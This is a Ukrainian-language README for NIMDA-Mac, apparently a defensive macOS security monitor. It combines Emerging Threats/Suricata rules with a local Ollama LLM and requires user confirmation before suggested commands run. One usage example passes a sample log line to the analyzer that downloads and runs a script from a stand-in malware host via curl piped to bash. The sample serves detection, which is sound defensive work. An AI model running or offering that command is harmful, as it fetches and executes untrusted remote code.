# NIMDA-Mac Enhanced Security System v2.0

🛡️ **Покращена система безпеки для macOS з інтеграцією ШІ та індустріальними стандартами**

## 🚀 Нові Можливості

### 1. 🔍 **Менеджер Правил Безпеки (RuleManager)**
- Автоматичне завантаження правил з Emerging Threats
- Парсинг та аналіз Suricata правил
- Регулярне оновлення правил безпеки

### 2. 🧠 **Покращений Аналізатор Загроз (ThreatAnalyzer)**
- Інтеграція з правилами безпеки
- ШІ-аналіз загроз за допомогою Ollama
- Контекстуальний аналіз логів та процесів
- Генерація рекомендованих дій

### 3. 🤖 **Human-in-the-Loop ШІ Помічник**
- Інтерактивний GUI з ШІ рекомендаціями
- Безпечне виконання команд з підтвердженням користувача
- Аналіз процесів та генерація команд для їх дослідження
- Підключення до Ollama для локального ШІ

### 4. 📊 **Розширений Моніторинг Безпеки**
- Хешування файлів для перевірки цілісності
- Моніторинг підозрілих завантажень
- Аналіз історії команд shell (bash/zsh)
- Детальний аналіз мережевих з'єднань

## 📁 Структура Проєкту

```
NIMDA-Mac/
├── core/                           # Основні модулі системи
│   ├── __init__.py
│   ├── rule_manager.py            # Менеджер правил безпеки
│   └── threat_analyzer.py         # Покращений аналізатор загроз
├── gui/                           # Графічний інтерфейс
│   ├── __init__.py
│   └── nimda_gui.py              # Enhanced GUI з ШІ інтеграцією
├── configs/                       # Конфігураційні файли
├── data/                         # Бази даних та логи
├── rules/                        # Правила безпеки (автоматично створюється)
├── security_monitor.py           # Розширений моніторинг
├── llm_security_agent.py         # ШІ агент безпеки
├── launch.py                     # Головний лаунчер
├── nimda_enhanced_demo.py        # Демонстрація нових можливостей
└── requirements.txt              # Залежності
```

## 🛠️ Встановлення та Налаштування

### 1. Встановлення залежностей
```bash
pip install -r requirements.txt
```

### 2. Налаштування Ollama (для ШІ функцій)
```bash
# Встановлення Ollama (якщо ще не встановлено)
curl -fsSL https://ollama.ai/install.sh | sh

# Запуск Ollama
ollama serve

# В іншому терміналі - завантаження моделі
ollama pull llama3
```

### 3. Перевірка системи
```bash
python launch.py info
```

## 🚀 Використання

### Запуск через лаунчер (рекомендовано)

```bash
# Запуск GUI з ШІ помічником
python launch.py gui

# Демонстрація всіх можливостей
python launch.py demo

# Оновлення правил безпеки
python launch.py update-rules

# Перевірка статусу ШІ
python launch.py check-ai

# Швидке сканування безпеки
python launch.py scan

# Інформація про систему
python launch.py info
```

### Прямий запуск компонентів

```bash
# Запуск GUI
python gui/nimda_gui.py

# Демонстрація
python nimda_enhanced_demo.py

# Тестування правил
python -c "from core.rule_manager import RuleManager; rm = RuleManager(); rm.update_all_rules()"
```

## 🎯 Основні Функції GUI

### 🤖 Вкладка "AI Assistant"
1. **Аналіз процесів**: Виберіть процес зі списку та отримайте ШІ рекомендації
2. **Генерація команд**: ШІ пропонує безпечні команди для дослідження загроз
3. **Human-in-the-Loop**: Всі команди потребують підтвердження користувача
4. **Статус ШІ**: Перевірка підключення до Ollama та доступних моделей

### 📊 Вкладка "Overview"
- Загальна статистика загроз
- Контроль моніторингу (старт/стоп)
- Індикатори стану системи

### 📜 Вкладка "Logs"
- Централізований перегляд логів
- Фільтрація за рівнем загроз
- Експорт логів

## 🔐 Безпека та Принципи

### Human-in-the-Loop
- ШІ **НЕ** виконує команди автоматично
- Всі дії потребують підтвердження користувача
- Показ команд перед виконанням
- Логування всіх дій

### Правила Безпеки
- Використання індустріальних стандартів (Emerging Threats)
- Регулярне оновлення правил
- Локальний аналіз без передачі даних назовні
- Модульна архітектура для легкого розширення

## 📋 Приклади Використання

### 1. Аналіз підозрілого процесу
```python
from core.threat_analyzer import ThreatAnalyzer

analyzer = ThreatAnalyzer()
process_info = {
    'pid': 1234,
    'name': 'suspicious_process',
    'path': '/tmp/unknown_binary'
}

result = analyzer.analyze_process_activity(process_info)
print(f"Threat level: {result['threat_level']}")
print(f"Suggested commands: {result['suggested_commands']}")
```

### 2. Аналіз логу
```python
log_entry = "bash -c 'curl http://malware.com/script.sh | bash'"
result = analyzer.analyze_log_entry(log_entry)

print(f"Rule violations: {len(result['rule_violations'])}")
print(f"AI analysis: {result['ai_analysis']}")
```

### 3. Моніторинг завантажень
```python
from security_monitor import SecurityMonitor

monitor = SecurityMonitor()
downloads = monitor.monitor_suspicious_downloads()

for file_info in downloads:
    if file_info['suspicious']:
        print(f"Suspicious file: {file_info['filename']}")
        print(f"Hash: {file_info['hash']}")
```

## 🔧 Налаштування

### Конфігурація ШІ
Відредагуйте параметри в `llm_security_agent.py`:
```python
ollama_host = "http://localhost:11434"  # Адреса Ollama
ollama_model = "llama3:latest"          # Модель для аналізу
```

### Конфігурація правил
Додайте власні набори правил у `core/rule_manager.py`:
```python
self.rulesets = {
    "emerging_threats": "https://rules.emergingthreats.net/...",
    "custom_rules": "https://your-custom-rules.com/rules.txt"
}
```

## 🚨 Вирішення Проблем

### ШІ недоступна
```bash
# Перевірте, чи запущено Ollama
ps aux | grep ollama

# Запустіть Ollama
ollama serve

# Перевірте доступні моделі
ollama list
```

### Проблеми з правилами
```bash
# Вручну оновіть правила
python launch.py update-rules

# Перевірте мережеве з'єднання
curl -I https://rules.emergingthreats.net/
```

### Проблеми з дозволами
```bash
# Надайте права на виконання
chmod +x launch.py

# Для системного моніторингу може знадобитися sudo
sudo python launch.py scan
```

## 📈 Моніторинг та Логування

### Логи зберігаються у:
- `data/security_events.db` - Події безпеки
- `data/scheduled_tasks.db` - Заплановані завдання
- `nimda_threat_analyzer.log` - Логи аналізатора

### Рівні загроз:
- **INFO**: Звичайна активність
- **MEDIUM**: Підозріла активність
- **HIGH**: Виявлені загрози
- **CRITICAL**: Критичні загрози

## 🤝 Розширення Системи

### Додавання нових правил
1. Додайте URL до `rule_manager.py`
2. Оновіть парсер під формат ваших правил
3. Перезапустіть систему

### Інтеграція з іншими ШІ
1. Розширте `LLMSecurityAgent` для підтримки інших API
2. Додайте налаштування у GUI
3. Оновіть методи аналізу в `ThreatAnalyzer`

## 📞 Підтримка

Для питань та звітів про помилки:
1. Перевірте логи системи
2. Запустіть `python launch.py info` для діагностики
3. Включіть детальні логи у звіт

---

**🛡️ NIMDA-Mac Enhanced - Ваш надійний захисник macOS з інтелектуальною підтримкою ШІ!**
